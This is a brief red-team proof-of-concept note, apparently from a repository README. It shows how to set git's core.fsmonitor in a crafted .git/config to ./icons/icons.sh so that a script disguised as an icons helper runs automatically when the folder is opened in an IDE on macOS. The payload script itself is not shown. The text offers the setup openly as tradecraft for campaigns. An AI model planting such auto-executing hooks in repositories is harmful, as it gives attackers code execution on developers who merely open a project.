This is a known thing, that can be used as a tradecraft during your redteam campaigns. For proof-of-work, git clone this repo add the below. Once done open the crafted folder with any IDE, (this POC is macOS specfic) modify according to your env.

```bash
cd git-fsmonitor
mkdir .git
nano .git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
	fsmonitor = ./icons/icons.sh
```
